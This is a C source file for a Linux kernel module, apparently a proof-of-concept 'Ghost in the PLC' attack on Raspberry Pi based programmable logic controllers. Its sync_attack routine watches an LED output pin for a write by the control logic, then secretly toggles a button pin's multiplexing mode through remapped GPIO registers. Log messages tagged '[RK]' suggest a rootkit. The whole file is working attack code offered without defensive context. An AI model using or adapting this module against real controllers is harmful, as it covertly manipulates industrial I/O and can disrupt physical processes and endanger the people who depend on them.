/*
 * Usage: insmod drk.ko
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <asm/io.h>

volatile unsigned* gpio = 0x00;
struct task_struct* task;

#define BCM2708_PERI_BASE        0x20000000
#define GPIO_BASE                (BCM2708_PERI_BASE + 0x200000) /* GPIO controller */
#define BLOCK_SIZE 4096

#define INP_GPIO(g) *(gpio+((g)/10)) &= ~(7<<(((g)%10)*3))
#define OUT_GPIO(g) *(gpio+((g)/10)) |=  (1<<(((g)%10)*3))
#define SET_GPIO_ALT(g,a) *(gpio+(((g)/10))) |= (((a)<=3?(a)+4:(a)==4?3:2)<<(((g)%10)*3))
#define GPIO_SET *(gpio+7)
#define GPIO_CLR *(gpio+10)
#define GET_GPIO(g) (*(gpio+13)&(1<<g))
#define GPIO_PULL *(gpio+37)
#define GPIO_PULLCLK0 *(gpio+38)

// Interval macros for usleep_range (t in milliseconds)
#define MIN_RANGE_USEC(t)	((t) * 1000 - 50)
#define MAX_RANGE_USEC(t)	((t) * 1000 + 50)

int sync_attack(void* data) {
	int g = 22; // Pin 22 attached to LED
	int gb = 24; // Pin 24 attached to Button
	int initial_state, led_state;

	initial_state = GET_GPIO(g); // Read state of the LED
	led_state = initial_state;

	// Look for the time of a write operation from the logic
	while (led_state == initial_state) {
		usleep_range(MIN_RANGE_USEC(1), MAX_RANGE_USEC(1)); // Polling granularity = 1 ms
		led_state = GET_GPIO(g); // Poll the LED state
	}

	usleep_range(MIN_RANGE_USEC(9), MAX_RANGE_USEC(9));
	INP_GPIO(gb);
	SET_GPIO_ALT(gb, 0);
	usleep_range(MIN_RANGE_USEC(1), MAX_RANGE_USEC(1));
	INP_GPIO(gb);

	while (!kthread_should_stop()) msleep(10);
	return 0;
}

static int __init io_remap_module_init(void) {
	int ret;

	gpio = ioremap(GPIO_BASE, BLOCK_SIZE);

	// Async call to the blink function
	task = kthread_run(&sync_attack, NULL, "sync");
	if (IS_ERR((void*)task)) {
		ret = PTR_ERR((void*)task);
		printk(KERN_INFO "[RK] Creating thread... failed %d\n", ret);
		iounmap(gpio);
		return ret;
	}
	printk(KERN_INFO "[RK] Task created!\n");
	return 0;
}

static void __exit io_remap_module_exit(void) {
	kthread_stop(task);
	iounmap(gpio);
	printk(KERN_INFO "[RK] exit\n");
}

module_init(io_remap_module_init);
module_exit(io_remap_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cl0wn & bl4ckic3");
MODULE_DESCRIPTION("Ghost in the PLC");
